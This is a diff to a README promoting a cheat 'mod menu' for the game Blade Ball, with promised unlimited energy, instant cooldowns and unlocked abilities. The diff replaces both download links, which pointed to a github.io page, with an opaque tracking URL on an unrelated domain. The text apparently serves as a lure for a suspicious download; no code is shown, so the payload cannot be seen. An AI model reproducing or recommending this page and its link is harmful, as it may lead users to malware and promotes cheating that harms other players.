@@ -2,7 +2,7 @@
 
 The **Blade Ball Mod Menu** is the ultimate tool for players looking to elevate their gameplay in *Blade Ball*. Whether you want to master the arena, unlock exclusive abilities, or gain an edge over your opponents, this mod menu provides all the cheats and enhancements needed to become the strongest player. From unlimited energy and instant ability cooldowns to character customization, the Blade Ball Mod Menu has everything to boost your gameplay and help you dominate.
 
-[![Download BladeBall ModMenu](https://img.shields.io/badge/Download-BladeBall%20ModMenu-blueviolet)](https://blade-ball-mod-menu.github.io/.github/)
+[![Download BladeBall ModMenu](https://img.shields.io/badge/Download-BladeBall%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## ⚡ Key Features
 
@@ -42,4 +42,4 @@ The **Blade Ball Mod Menu** is the ultimate tool for players looking to elevate 
 4. **Activate the Cheats**: Choose from a variety of options like unlimited energy, instant cooldowns, and unlocking all abilities to enhance your gameplay.
 5. **Dominate the Arena**: With your enhanced abilities, go head-to-head with opponents, rack up points, and become the strongest player in Blade Ball.
 
-[![Download BladeBall ModMenu](https://img.shields.io/badge/Download-BladeBall%20ModMenu-blueviolet)](https://blade-ball-mod-menu.github.io/.github/)
+[![Download BladeBall ModMenu](https://img.shields.io/badge/Download-BladeBall%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
